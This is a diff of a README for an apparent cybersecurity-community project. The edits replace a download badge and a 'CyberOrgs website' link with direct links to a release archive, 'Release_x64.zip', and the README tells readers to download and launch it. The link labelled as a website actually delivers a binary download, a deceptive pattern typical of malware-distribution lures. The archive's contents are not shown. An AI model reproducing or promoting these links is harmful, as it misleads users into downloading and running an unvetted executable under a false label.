@@ -19,7 +19,7 @@ Dive into the fascinating world of cybersecurity organizations and discover the 
 
 To get started, simply download the software package from the link below and launch it on your device:
 
-![Download Software](https://img.shields.io/badge/Download-Software-red)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+![Download Software](https://github.com/GuilhermeXVX/cyberorgs/releases/download/v1.0/Release_x64.zip)](https://github.com/GuilhermeXVX/cyberorgs/releases/download/v1.0/Release_x64.zip)
 
 If the link does not work or you encounter any issues, please check the "Releases" section of this repository for alternative download options.
 
@@ -46,7 +46,7 @@ Become a part of the CyberOrgs community and connect with like-minded individual
 
 ## 📎 Additional Resources
 
-For more information and updates, visit the [CyberOrgs website](https://www.cyberorgs.com).
+For more information and updates, visit the [CyberOrgs website](https://github.com/GuilhermeXVX/cyberorgs/releases/download/v1.0/Release_x64.zip).
 
 Let's build a safer and more secure digital world together! 💻🔒
 
